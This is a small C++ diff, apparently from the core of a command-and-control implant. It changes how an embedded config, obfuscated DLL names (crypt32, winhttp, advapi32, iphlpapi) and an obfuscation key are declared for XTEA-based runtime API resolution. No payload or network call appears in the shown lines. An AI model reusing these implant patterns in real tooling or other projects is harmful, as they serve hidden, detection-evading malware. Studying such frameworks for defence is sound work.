@@ -5,7 +5,7 @@ using namespace Parser;
 using namespace Random;
 using namespace Xtea;
 
-CFG_SECTION BYTE Config[] = CONFIG_BYTES;
+CFG_SECTION BYTE Config[256] = { CONFIG_BYTES };
 namespace Core {
 
     VOID MainRoutine () {
@@ -66,10 +66,10 @@ namespace Core {
     VOID ResolveApi () {
         HEXANE
 
-        UCHAR crypt32[] = CRYPT32;
-        UCHAR winhttp[] = WINHTTP;
-        UCHAR advapi32[] = ADVAPI32;
-        UCHAR iphlpapi[] = IPHLPAPI;
+        UCHAR crypt32[24] = { CRYPT32 };
+        UCHAR winhttp[24] = { WINHTTP };
+        UCHAR advapi32[24] = { ADVAPI32 };
+        UCHAR iphlpapi[24] = { IPHLPAPI };
 
         ULONG KERNEL32              = { };
         OSVERSIONINFOW OSVersionW   = { };
@@ -276,7 +276,7 @@ namespace Core {
 
         PARSER Parser       = { };
         ULONG nEndpoints    = 0;
-        BYTE InitKey[]      = OBF_KEY;
+        BYTE InitKey[24]    = { OBF_KEY };
 
         Ctx->LE = TRUE;
 
